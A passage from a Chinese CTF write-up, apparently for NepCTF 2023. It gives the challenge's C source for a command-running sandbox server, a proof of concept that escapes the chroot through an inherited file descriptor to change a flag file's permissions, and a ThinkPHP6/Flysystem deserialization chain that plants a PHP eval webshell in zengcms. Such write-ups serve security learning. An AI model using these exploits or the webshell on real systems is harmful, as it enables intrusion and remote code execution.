class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -o test1 test1.c -lcrypto -lm -lrt</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_dir</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/home/ctf/sandbox/&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    MD5_CTX ctx;</span><br><span class="line">    <span class="type">char</span> md5_res[<span class="number">17</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> key[<span class="number">100</span>]=<span class="string">&quot;NEPCTF_6666&quot;</span>;</span><br><span class="line">    <span class="type">char</span> sandbox_dir[<span class="number">100</span>]=<span class="string">&quot;/home/ctf/sandbox/&quot;</span>;</span><br><span class="line">    <span class="type">char</span> dir_name[<span class="number">100</span>]=<span class="string">&quot;/home/ctf/sandbox/&quot;</span>;</span><br><span class="line">    FILE *new_pip;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">r</span>;</span></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;r);</span><br><span class="line">    <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    MD5_Init(&amp;ctx);</span><br><span class="line">    MD5_Update(&amp;ctx, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    MD5_Final(md5_res, &amp;ctx);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;(dir_name[i*<span class="number">2</span> + <span class="number">18</span>]), <span class="string">&quot;%02hhx&quot;</span>, md5_res[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    mkdir(dir_name, <span class="number">0755</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(dir_name)==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;chdir err, exiting\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;chmod 777 &quot;</span>,dir_name);</span><br><span class="line">    system(cmd);</span><br><span class="line">    mkdir(<span class="string">&quot;bin&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;lib&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;lib64&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;lib/x86_64-linux-gnu&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    system(<span class="string">&quot;cp /bin/bash bin/sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cp /lib/x86_64-linux-gnu/libdl.so.2 lib/x86_64-linux-gnu/&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cp /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cp /lib/x86_64-linux-gnu/libtinfo.so.5 lib/x86_64-linux-gnu/&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cp /lib64/ld-linux-x86-64.so.2 lib64/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;.&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;chroot err, exiting\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">command</span><span class="params">(<span class="type">int</span> server_socket,<span class="type">int</span> client_socket)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x666</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x666</span>);</span><br><span class="line">    write(client_socket,<span class="string">&quot;Tmp-Command:&quot;</span>,<span class="keyword">sizeof</span>(<span class="string">&quot;Tmp-Command:&quot;</span>));</span><br><span class="line">    read(client_socket, buf, <span class="number">0x10</span>);</span><br><span class="line">    setgid(<span class="number">1001</span>);</span><br><span class="line">    setuid(<span class="number">1001</span>);</span><br><span class="line">    popen(buf,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get_ip_address</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *interface_name, <span class="type">char</span> *ip_address)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line">    <span class="comment">// Create a socket</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Socket creation failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Set the interface name in the ifreq structure</span></span><br><span class="line">    <span class="built_in">strncpy</span>(ifr.ifr_name, interface_name, IFNAMSIZ - <span class="number">1</span>);</span><br><span class="line">    ifr.ifr_name[IFNAMSIZ - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="comment">// Get the IP address using the SIOCGIFADDR ioctl request</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(sockfd, SIOCGIFADDR, &amp;ifr) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl failed&quot;</span>);</span><br><span class="line">        close(sockfd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(sockfd);</span><br><span class="line">    <span class="comment">// Convert the binary IP address to a human-readable string</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">addr</span> =</span> (<span class="keyword">struct</span> sockaddr_in *)&amp;ifr.ifr_addr;</span><br><span class="line">    <span class="built_in">strcpy</span>(ip_address, inet_ntoa(addr-&gt;sin_addr));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    init_dir();</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Server setup</span></span><br><span class="line">    <span class="type">int</span> server_socket, client_socket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> client_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="comment">// Create socket</span></span><br><span class="line">    server_socket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_socket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Socket creation failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Set up server address</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;server_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    server_addr.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">    <span class="comment">// Bind socket to address and port</span></span><br><span class="line">    <span class="keyword">if</span> (bind(server_socket, (<span class="keyword">struct</span> sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Bind failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Listen for incoming connections</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_socket, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Listen failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server is listening on port 9999...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// Accept connection from client</span></span><br><span class="line">    client_socket = accept(server_socket, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);</span><br><span class="line">    <span class="keyword">if</span> (client_socket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        client_socket = accept(server_socket, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> client_ip[INET_ADDRSTRLEN];</span><br><span class="line">    inet_ntop(AF_INET, &amp;client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client connected from IP: %s\n&quot;</span>, client_ip);</span><br><span class="line">    <span class="type">char</span> ip_address[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *interface_name = <span class="string">&quot;eth0&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (get_ip_address(interface_name, ip_address) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IP address of eth0: %s\n&quot;</span>, ip_address);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to get the IP address of eth0.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(flag) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(client_ip,ip_address)) &#123;</span><br><span class="line">            send(client_socket,<span class="string">&quot;Only nc by localhost!\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="string">&quot;Only nc by localhost!\n&quot;</span>),<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    command(server_socket,client_socket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这部分出题人给了我挺多提示的。因为我不太懂底层c的逻辑。然后加上pwn爹们的帮助才写出来的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928947282-e959258c-cbda-4e87-bcb5-db017f954314.png#averageHue=%23232120&clientId=u6a635397-504c-4&from=paste&height=551&id=ue2e9fb6b&originHeight=689&originWidth=1186&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63110&status=done&style=none&taskId=ue5b845a8-29e4-49c8-aef0-00d1ddaee20&title=&width=948.8" alt="image.png"><br>这一部分的文件描述符并没有关闭，文件流也没关闭，因此是可以连接父进程的，<code>openat和fschmod</code>这两个内置函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* filename = <span class="string">&quot;../../../../flag_mini&quot;</span>;</span><br><span class="line">    <span class="type">int</span> fd = openat(<span class="number">3</span>, filename, O_CREAT | O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理打开文件失败的情况</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改文件权限为 777</span></span><br><span class="line">    <span class="keyword">if</span> (fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理更改文件权限失败的情况</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用新文件进行操作...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以自行编译这个c文件，然后nc进identity以ctf用户运行，这样就可以更改flag_mini的权限为777，我们就可以读取拉<del>写文件很简单，把上述源码base64编码。<br><code>echo I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCBjaGFyKiBmaWxlbmFtZSA9ICIuLi8uLi8uLi8uLi9mbGFnX21pbmkiOwogICAgaW50IGZkID0gb3BlbmF0KDMsIGZpbGVuYW1lLCBPX0NSRUFUIHwgT19XUk9OTFkpOwogICAgaWYgKGZkID09IC0xKSB7CiAgICAgICAgLy8g5aSE55CG5omT5byA5paH5Lu25aSx6LSl55qE5oOF5Ya1CiAgICAgICAgcHJpbnRmKCIxIik7CiAgICB9CgogICAgLy8g5pu05pS55paH5Lu25p2D6ZmQ5Li6IDc3NwogICAgaWYgKGZjaG1vZChmZCwgU19JUldYVSB8IFNfSVJXWEcgfCBTX0lSV1hPKSA9PSAtMSkgewogICAgICAgIC8vIOWkhOeQhuabtOaUueaWh+S7tuadg+mZkOWksei0peeahOaDheWGtQogICAgICAgIHByaW50ZigiMiIpOwogICAgfQoKICAgIC8vIOS9v+eUqOaWsOaWh+S7tui/m+ihjOaTjeS9nC4uLgoKICAgIHJldHVybiAwOwp9|base64 -d &gt;poc.c</code><br>注意，由于ctf用户运行是在沙盒里，我们也需要切换过去<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929136828-64e6317e-106b-448a-a089-d12f1cb3487e.png#averageHue=%23383736&clientId=u6a635397-504c-4&from=paste&height=166&id=u9861acb1&originHeight=208&originWidth=1003&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17909&status=done&style=none&taskId=u623c67a6-ae99-4a27-95fb-29c9f425b90&title=&width=802.4" alt="image.png"><br><code>/home/ctf/sandbox/d41d8cd98f00b204e9800998ecf8427e</code><br><code>gcc poc.c -o poc</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929171621-5b679238-97df-4e91-bd61-982c3c7d27f2.png#averageHue=%23252322&clientId=u6a635397-504c-4&from=paste&height=549&id=u087133b2&originHeight=686&originWidth=1260&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96945&status=done&style=none&taskId=uc79c9614-7838-499b-8f62-f47e0a31fea&title=&width=1008" alt="image.png"><br>eth0网卡是172.17.0.19，源码中说了，会判断我们的nc是否和eth0对应的ip一样<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929226278-50426759-2a1a-4fdc-b094-f84948e9e147.png#averageHue=%23312e2d&clientId=u6a635397-504c-4&from=paste&height=568&id=u902fbb19&originHeight=710&originWidth=1289&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93757&status=done&style=none&taskId=u4601febe-c7b9-4648-bf59-5bb5bc75f5a&title=&width=1031.2" alt="image.png"><br>成功</del>然后去读取flag<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929240085-a97e89ac-0d87-4a91-98f4-2a6893544746.png#averageHue=%23454240&clientId=u6a635397-504c-4&from=paste&height=95&id=Hi3FM&originHeight=119&originWidth=1369&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26236&status=done&style=none&taskId=ufecc45c3-3b70-4e4e-b396-c37822962bc&title=&width=1095.2" alt="image.png"></p>
<h2 id="独步天下-破除试炼-加冕成王"><a href="#独步天下-破除试炼-加冕成王" class="headerlink" title="独步天下-破除试炼_加冕成王"></a>独步天下-破除试炼_加冕成王</h2><p>最后一层也是最绕最套的一层。扫端口出来<code>192.168.200.1</code>的80端口有一个web服务。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929303306-2e484e24-a2b9-4c17-8e06-bd4ba54c5960.png#averageHue=%23aeadad&clientId=u6a635397-504c-4&from=paste&height=833&id=uad682dd6&originHeight=1041&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=178039&status=done&style=none&taskId=u0d5d966c-8574-4955-acd3-032bfea3b3f&title=&width=1534.4" alt="image.png"><br>是一个zengcms。我本来想去www目录看源码，结果没权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929327369-a994d0fa-0861-4022-9646-ace8f113d9a1.png#averageHue=%2332302e&clientId=u6a635397-504c-4&from=paste&height=121&id=uae9d7748&originHeight=151&originWidth=1066&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19920&status=done&style=none&taskId=u207b9cc1-f848-4e9e-a1a0-0ae798de60a&title=&width=852.8" alt="image.png"><br>好家伙需要自己官网下，好在就只有一个版本。简单拿seay分析了一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929437567-d33e04e5-693e-4f11-92a8-16f4cff76e0c.png#averageHue=%23f1f0f0&clientId=u6a635397-504c-4&from=paste&height=446&id=u3927e5e7&originHeight=558&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=206458&status=done&style=none&taskId=uc047b25b-1db7-47c6-b5e6-2ec7c152523&title=&width=1076" alt="image.png"><br>搜了一下usner，好家伙全是unserialize<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929500245-ed8b2bb7-010b-49e0-8439-7dc466d6b05d.png#averageHue=%23242727&clientId=u6a635397-504c-4&from=paste&height=358&id=u75e2455e&originHeight=447&originWidth=1319&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72241&status=done&style=none&taskId=u804d24b4-a8d9-4afa-8832-ecf03e6372d&title=&width=1055.2" alt="image.png"><br>这里直接unserialize了，然后官网说是基于thinkphp6的，我这里随便找一条链子就行了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Filesystem</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;*/&lt;?php phpinfo();eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;expire = <span class="string">&quot;yydsy4&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;adapter = <span class="keyword">new</span> <span class="title class_">\League\Flysystem\Adapter\Local</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;pop.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Local</span> <span class="title class_">extends</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">pathPrefix</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pathPrefix = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Adapter</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Adapter</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以写进一个一句话木马到根目录，但是还有个问题就是cookie是加密了的，我们生成cookie需要手动生成<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929576678-5df8c065-fc25-42e4-aac3-1e51a78e16a5.png#averageHue=%23242727&clientId=u6a635397-504c-4&from=paste&height=42&id=ube8fd0a4&originHeight=53&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14066&status=done&style=none&taskId=udc5302b1-257f-4daf-8af8-1cb34461bcb&title=&width=662.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929586589-1dd51092-fa43-486d-8403-4a986d51d2a7.png#averageHue=%23232626&clientId=u6a635397-504c-4&from=paste&height=490&id=u9b852f1c&originHeight=613&originWidth=1287&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96951&status=done&style=none&taskId=u7f57d1af-352a-4410-91fd-e7744c5e1c5&title=&width=1029.6" alt="image.png"><br>手动运行生成exp太麻烦，我直接搭建了一个本地cms服务，然后在index加入了我要加密的内容。也就是上述poc生成的base64<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929620478-7ecd0bfd-92e4-4ba9-b7b4-e70978639df3.png#averageHue=%23252728&clientId=u6a635397-504c-4&from=paste&height=239&id=u39e0cda6&originHeight=299&originWidth=1455&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40191&status=done&style=none&taskId=ua178d577-a32a-44e6-a8c7-ba7e5a9fdef&title=&width=1164" alt="image.png"><br>本地登录后台后就可以看到结果<br><img 